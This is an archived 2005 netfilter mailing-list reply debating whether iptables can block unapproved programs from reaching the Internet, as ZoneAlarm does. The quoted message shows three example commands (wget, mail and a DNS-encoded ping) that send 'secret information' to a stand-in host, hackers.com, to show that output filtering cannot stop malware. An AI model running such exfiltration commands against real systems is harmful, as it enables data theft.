From: "R. DuFresne" <dufresne@sysinfo.com>
Subject: Re: Nice ZoneAlarm that might be useful for Iptables
Date: Tue, 31 May 2005 14:18:01 -0400 (EDT)
Message-ID: <Pine.LNX.4.60.0505311407460.5267@darkstar.sysinfo.com>
References: <429BDF9F.7070707@mindspring.com>
	<20050531043310.GF3681@der-frank.org>
Mime-Version: 1.0
Return-path: <netfilter-bounces@lists.netfilter.org>
In-Reply-To: <20050531043310.GF3681@der-frank.org>
List-Id: <netfilter.vger.kernel.org>
List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
List-Archive: </pipermail/netfilter>
List-Post: <mailto:netfilter@lists.netfilter.org>
List-Help: <mailto:netfilter-request@lists.netfilter.org?subject=help>
List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
Sender: netfilter-bounces@lists.netfilter.org
Errors-To: netfilter-bounces@lists.netfilter.org
Content-Type: TEXT/PLAIN; charset="us-ascii"; format="flowed"
Content-Transfer-Encoding: 7bit
To: Frank Gruellich <frank@der-frank.org>
Cc: netfilter@lists.netfilter.org

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1


Zone alarm tends to run on single user systems, and is geared well for 
that kind of access.  Imagine trying to allow 1500 users the ability to 
control your fw rules to do something similiar in a production multi-user 
env, from various systems forwarding through the fw in both directions.

How many gatekeepers would it take to keep an eye on this kind of setup?
And how well trusted are your average users?


Perhaps on a standalone linux desktop this might be feasible, but, 
certainly not in a real working env.

Thanks,

Ron DuFresne

On Tue, 31 May 2005, Frank Gruellich wrote:

> Hi,
>
> * Larry Alkoff <labradley@mindspring.com> 30. May 05:
>> [Zonealarm]
>> In addition, it will warn if a program is asking for server rights
>> although and ask for approval to grant that, although I don't understand
>> what they mean by "server rights".
>
> AFAIK Zonealarm it means, that a program starts a server: it listens on
> a port.  For Unix it needs root priveleges to listen on ports below 1024
> (dunno about Windows).
>
>> Most Iptables scripts I've seen do very little OUTPUT filtering which
>> means a malicious program, if it got access somehow, could have free
>> range to send packets out.  Zombie or spyware perhaps.
>
> While OUTPUT has nothing to do with servers, it is simply impossible.
> You can't protect an infected host.
>
>> The ability to block this by only allowing "approved" programs to access
>> the Internet would be a nice addition to Iptables.
>
> Define "access the Internet".  There will be some hundreds of ways for
> malware to send data you can't even catch with iptables.  There are some
> more dozens of ways you can't block at all.  How do you intend to catch
>
> $ wget 'http://www.hackers.com/script.php?info=this%20is%20my%20very%20secret%20information'
> $ echo "this is the very secret information" |mail -s "$USER@`hostname -f`" jr@hackers.com
> $ ping -c1 www.this.is.my.very.secret.information.hackers.com
>
> and many other things?  Don't install software you don't trust.  Sorry,
> but this is AFAICS the only way.
>
> Kind regards,
> Frank.
> --
> Sigmentation fault
>

- -- 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         admin & senior security consultant:  sysinfo.com
                         http://sysinfo.com
Key fingerprint = 9401 4B13 B918 164C 647A  E838 B2DF AFCC 94B0 6629

...We waste time looking for the perfect lover
instead of creating the perfect love.

                 -Tom Robbins <Still Life With Woodpecker>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.4 (GNU/Linux)

iD8DBQFCnKpcst+vzJSwZikRAjNeAJ0Zjg+ZkUSHAt9ffiTtg4Kq6qe7owCeM6bY
/sharOZocwpsu3oMUTun5R8=
=tnSc
-----END PGP SIGNATURE-----

